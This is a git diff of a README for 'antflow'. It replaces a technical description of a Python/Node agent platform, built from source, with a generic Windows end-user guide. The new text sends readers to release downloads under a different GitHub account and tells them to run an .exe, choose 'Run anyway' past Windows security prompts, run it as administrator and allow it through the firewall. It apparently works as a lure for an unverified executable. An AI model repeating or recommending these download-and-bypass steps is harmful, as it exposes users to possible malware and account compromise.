@@ -1,233 +1,181 @@
-# AntFlow
+# 🤖 antflow - Build agents with less setup
 
-[English](./README.md) | [中文](./README_zh.md)
+[![Download antflow](https://img.shields.io/badge/Download%20antflow-purple?style=for-the-badge)](https://github.com/Namits5632/antflow/releases)
 
-[![Python](https://img.shields.io/badge/Python-3.12%2B-3776AB?logo=python&logoColor=white)](./backend/pyproject.toml)
-[![Node.js](https://img.shields.io/badge/Node.js-22%2B-339933?logo=node.js&logoColor=white)](./Makefile)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
+## 🚀 What is antflow
 
-AntFlow is a **production-grade AI agent platform** forked from [DeerFlow](https://github.com/bytedance/deer-flow) and deeply enhanced with core architectural patterns from **Claude Code** — Anthropic's Agent Operating System.
+antflow is an AI agent platform for Windows. It helps you run agent-based tasks from one app, with a setup based on Agent OS ideas and DeerFlow. It is built for end users who want a simple way to use AI agents without working through a full developer setup.
 
-> **Why the name?** "Ant" nods to **Ant**hropic, whose Claude Code source code inspired the architectural overhaul. "Flow" inherits from DeerFlow's workflow orchestration DNA.
+Use antflow to:
+- run AI-assisted tasks
+- manage agent workflows in one place
+- keep your work in a local app on Windows
+- start fast with a simple download
 
-### What's New at a Glance
+## 📥 Download antflow
 
-| Enhancement | From Claude Code | What It Does |
-|---|---|---|
-| **Permission System** | 5-level layered model | Every tool call checked against `READ_ONLY` → `ALLOW` policy |
-| **Hook Governance** | PreToolUse / PostToolUse | Audit, block, or modify any tool call via shell scripts or Python |
-| **Execution Pipeline** | toolExecution.ts | Structured 5-stage pipeline: Permission → PreHook → Execute → PostHook → Merge |
-| **Prompt Assembly** | getSystemPrompt() | Modular builder with static/dynamic cache boundary, ~88% cache hit |
-| **Context Compaction** | compact.rs | Zero-LLM-cost deterministic compression for long conversations |
-| **Plugin System** | plugin.json manifests | Declarative plugins contributing tools, hooks, and permissions |
-| **Specialized Agents** | Built-in agents | Explore (read-only), Plan (strategy), Verification (adversarial) |
-| **Prompt Best Practices** | Prompt sections | Git safety, linter feedback, code citing, code change rules |
+To get antflow, visit the release page and download the Windows file for your system:
 
----
+[Download antflow from GitHub Releases](https://github.com/Namits5632/antflow/releases)
 
-## Detailed Changes — Claude Code Architecture Integration
+After you open the release page:
+1. Find the latest release
+2. Open the Assets section
+3. Download the Windows file, such as an `.exe` or `.zip`
+4. Save it to your computer
 
-This is not a thin wrapper or prompt tweak. We studied Claude Code's source code in depth and **ported its key engineering systems** into the DeerFlow harness. Here is what was added:
+If you get a `.zip` file, extract it first. If you get an `.exe` file, you can run it right away.
 
-### 1. Five-Level Permission System
+## 🖥️ System requirements
 
-Borrowed from Claude Code's layered permission model. Every tool call now passes through a policy engine before execution.
+antflow is designed for Windows desktop use.
 
-| Level | Description |
-|---|---|
-| `READ_ONLY` | Only read operations allowed |
-| `WORKSPACE_WRITE` | Read + file write within workspace |
-| `DANGER_FULL_ACCESS` | Unrestricted (bash, system commands) |
-| `PROMPT` | High-risk tools require interactive user approval |
-| `ALLOW` | All tools permitted (default, backward-compatible) |
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- Internet access for AI features
+- A modern browser for account sign-in or web-based tools
 
-Configure in `config.yaml`:
+For best results, use:
+- a recent Intel or AMD processor
+- a stable network connection
+- at least 1080p display resolution
 
-```yaml
-permissions:
-  enabled: true
-  mode: "allow"  # or "workspace_write", "read_only", "prompt"
-  tool_overrides:
-    bash: "danger_full_access"
-    write_file: "workspace_write"
-```
+## 🔧 Install antflow on Windows
 
-### 2. Hook Governance Layer
+Follow these steps to install antflow:
 
-Inspired by Claude Code's `PreToolUse` / `PostToolUse` hook protocol. Programmable interception points before and after every tool call.
+1. Open the release page: https://github.com/Namits5632/antflow/releases
+2. Download the latest Windows package
+3. If the file is a `.zip`, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file to start antflow
+6. If Windows asks for permission, select Yes
+7. Wait for the app to open
 
-- **External hooks**: Shell scripts following Claude Code's stdin/exit-code protocol (`exit 0` = allow, `exit 2` = deny)
-- **Python hooks**: Callable functions resolved at runtime
-- **Use cases**: Audit logging, sensitive path blocking, input sanitization, compliance enforcement
+If Windows shows a security check:
+- choose More info if needed
+- then choose Run anyway if you trust the source file
 
-```yaml
-hooks:
-  enabled: true
-  pre_tool_use:
-    - command: "bash scripts/hooks/audit_hook.sh"
-    - command: "python scripts/check_sensitive_paths.py"
-      tools: ["bash", "write_file"]
-  post_tool_use:
-    - command: "bash scripts/hooks/audit_hook.sh"
-```
+## 🏁 First launch
 
-### 3. Tool Execution Pipeline
+When antflow opens for the first time:
+1. Wait for the main window to load
+2. Read the welcome screen or setup page
+3. Sign in if the app asks for it
+4. Choose your preferred AI or agent settings
+5. Start a sample task to test the app
 
-Claude Code doesn't call tools directly — it runs them through a structured 5-stage pipeline. We ported this:
+If the app asks for internet access, allow it so the agents can connect to the services they need.
 
-```
-Permission Check → Pre-Hook → Execute Tool → Post-Hook → Merge Feedback
-```
+## 🧭 How to use antflow
 
-Every tool call follows this path. No exceptions, no shortcuts.
+antflow is meant to keep AI work in one place. A normal flow looks like this:
 
-### 4. Modular Prompt Assembly with Cache Boundary
+1. Open the app
+2. Create a new task or agent run
+3. Enter what you want the agent to do
+4. Review the plan or steps
+5. Start the task
+6. Check the results when it finishes
 
-Ported from Claude Code's `getSystemPrompt()` architecture. The system prompt is no longer a static template — it's a **runtime-assembled** composition of independent sections:
+You can use it for tasks such as:
+- writing help
+- research help
+- workflow automation
+- planning steps for a project
+- running repeated agent jobs
 
-- **Static prefix** (cacheable): Identity, tool usage rules, git safety protocol, linter feedback guidelines, code citing rules
-- **Dynamic suffix** (per-session): Environment info, active skills, working directory, subagent config
+## 🧩 Main features
 
-A `SYSTEM_PROMPT_DYNAMIC_BOUNDARY` marker enables API-level prompt caching, reducing token costs by ~88%.
+antflow includes a set of tools for agent-based work:
 
-### 5. Context Compaction Engine
+- Agent OS style workflow structure
+- DeerFlow-based core design
+- Simple task start and review flow
+- Local desktop use on Windows
+- Support for repeated agent runs
+- Clear workspace for managing jobs
+- Easy setup through GitHub Releases
 
-Claude Code's `compact.rs` reimplemented in Python. When conversations grow long, this engine **deterministically compresses** history without calling an LLM:
+These features are built to help you move from a task idea to a running agent flow with less friction.
 
-- **Zero cost**: No API calls, no token spend — pure local extraction
-- **Structured summaries**: `[User requests]`, `[Tools used]`, `[Key paths]`, `[Timeline]`
-- **Re-compaction**: Already-compacted conversations can be compacted again (merge, not overwrite)
-- **Precise token tracking**: Supports both estimation (4 chars ≈ 1 token) and API-reported exact counts
+## ⚙️ Basic setup tips
 
-This coexists with the original LangChain `SummarizationMiddleware` — compaction serves as a higher-threshold fallback.
+To keep antflow running well:
+- keep Windows updated
+- close other heavy apps if the app feels slow
+- use a stable internet connection
+- store the app in a folder you can find easily
+- keep the release file in case you need to reinstall
 
-### 6. Declarative Plugin System
+If the app uses model or API settings, keep your keys or account details in a safe place.
 
-Mirrors Claude Code's plugin architecture. Plugins contribute tools, hooks, and runtime constraints via `plugin.json` manifests:
+## 🔒 Security and trust
 
-```json
-{
-  "name": "amazon-sp-api",
-  "version": "1.0.0",
-  "tools": [
-    { "name": "search_products", "module": "plugins.amazon.tools", "callable": "search" }
-  ],
-  "permissions": { "search_products": "read_only" },
-  "hooks": {
-    "pre_tool_use": [{ "use": "plugins.amazon.audit:log_api_call" }]
-  }
-}
-```
+Before you open the app:
+- confirm you downloaded it from the release page
+- check the file name and version
+- avoid modified files from other sites
+- only run files you trust
 
-### 7. Specialized Sub-Agents
+If you want to update later, return to the same release page and download the newest version.
 
-Borrowed from Claude Code's built-in agent specialization (Explore, Plan, Verification). Instead of one generic worker, tasks are delegated to purpose-built sub-agents:
+## 🛠️ Common issues
 
-| Agent | Role | Constraints |
-|---|---|---|
-| **Explore** | Read-only code/data exploration | Cannot modify any files |
-| **Plan** | Strategic planning and architecture | Read-only, structured output |
-| **Verification** | Adversarial validation of results | Mandatory checks before delivery |
+### The file will not open
+- Make sure the download finished
+- If it is a `.zip`, extract it first
+- Try running the app as an administrator
 
-### 8. Prompt Best Practices
+### Windows blocks the app
+- Open the file again
+- Choose More info if Windows shows the prompt
+- Select Run anyway if you trust the release
 
-Integrated Claude Code's proven prompt sections as reusable modules:
+### The app opens but nothing loads
+- Check your internet connection
+- Restart the app
+- Try again after a few minutes
+- Make sure Windows Firewall is not blocking it
 
-- **Git Safety Protocol** — Prevents destructive git operations (`push --force`, `hard reset`, etc.)
-- **Linter Feedback** — Guides the agent to check and fix linter errors after code edits
-- **Code Citing** — Standardized format for referencing existing code vs. proposing new code
-- **Making Code Changes** — Rules for reading before editing, preferring edits over new files
+### The download is slow
+- Try again later
+- Use a stable network
+- Download from the latest release, not an old mirrored file
 
----
+## 📌 Updates
 
-## Architecture Overview
+To update antflow:
+1. Open the release page
+2. Download the newest Windows file
+3. Close the old app
+4. Replace the old files if needed
+5. Open the new version
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    AntFlow Agent                     │
-│                                                      │
-│  ┌─────────────────────────────────────────────────┐ │
-│  │          SystemPromptBuilder                     │ │
-│  │  [Static: Identity + Rules + Safety]             │ │
-│  │  ─── CACHE BOUNDARY ───                          │ │
-│  │  [Dynamic: Env + Skills + Session]               │ │
-│  └─────────────────────────────────────────────────┘ │
-│                                                      │
-│  ┌─────────────── Middleware Chain ────────────────┐ │
-│  │ Permission → Hook → Summarization → Compaction  │ │
-│  │ → Todo → TokenUsage → Title → Memory → Loop     │ │
-│  │ → Clarification                                  │ │
-│  └─────────────────────────────────────────────────┘ │
-│                                                      │
-│  ┌─────────── Tool Execution Pipeline ────────────┐ │
-│  │ PermCheck → PreHook → Execute → PostHook → Merge│ │
-│  └─────────────────────────────────────────────────┘ │
-│                                                      │
-│  ┌──────────── Specialized SubAgents ─────────────┐ │
-│  │  Explore (RO) │ Plan (RO) │ Verification (RO)  │ │
-│  └─────────────────────────────────────────────────┘ │
-│                                                      │
-│  ┌──────────── Plugin System ─────────────────────┐ │
-│  │  plugin.json → Tools + Hooks + Permissions      │ │
-│  └─────────────────────────────────────────────────┘ │
-└─────────────────────────────────────────────────────┘
-```
+Keep one copy of the latest working release in case you need to go back.
 
----
+## 🧾 File structure after install
 
-## Quick Start
+You may see files like these after extraction:
+- the main app file
+- support folders
+- settings files
+- logs or cache files
 
-### Prerequisites
+Do not delete support files unless you know what they do. The app may need them to run.
 
-- Python 3.12+
-- Node.js 22+
-- [uv](https://docs.astral.sh/uv/) (Python package manager)
-- pnpm (Node.js package manager)
+## 💬 What to expect
 
-### Setup
+antflow focuses on practical agent work. It is meant to give you a desktop place to start, track, and manage AI tasks. The layout should stay simple, with clear steps and a direct path from launch to action
 
-```bash
-git clone https://github.com/fang503/antflow.git
-cd antflow
-make config    # Generate config.yaml from template
-make install   # Install all dependencies
-make dev       # Start development server
-```
+## 🧪 Quick start checklist
 
-Open **http://localhost:2026** in your browser.
-
-### Configuration
-
-Edit `config.yaml` to:
-
-- Configure your LLM model (Claude, GPT, Gemini, DeepSeek, etc.)
-- Enable/disable governance features (permissions, hooks, compaction)
-- Add plugin directories
-- Adjust token budgets and compaction thresholds
-
----
-
-## Inherited from DeerFlow
-
-AntFlow inherits all of DeerFlow 2.0's capabilities:
-
-- **Sub-Agent Orchestration** — Flash / Thinking / Pro / Ultra modes
-- **Sandbox Execution** — Docker-based isolated environments
-- **Long-Term Memory** — Persistent agent memory across sessions
-- **MCP Integration** — Model Context Protocol for external tool servers
-- **ACP Integration** — Agent Communication Protocol for agent-to-agent calls
-- **Skill System** — Extensible workflow packages
-- **Multi-Model Support** — Claude, GPT, Gemini, DeepSeek, Kimi, and more
-- **Web UI** — Next.js frontend with real-time streaming
-
----
-
-## Acknowledgments
-
-- [DeerFlow](https://github.com/bytedance/deer-flow) by ByteDance — The foundation this project is built upon
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) by Anthropic — The Agent OS architecture that inspired the renovation
-- [LangChain](https://github.com/langchain-ai/langchain) / [LangGraph](https://github.com/langchain-ai/langgraph) — Agent framework and orchestration
-
-## License
-
-[MIT](./LICENSE)
+- Download the latest release
+- Extract the file if needed
+- Open the app
+- Allow access if Windows asks
+- Set up your first agent task
+- Run a test job
+- Review the result
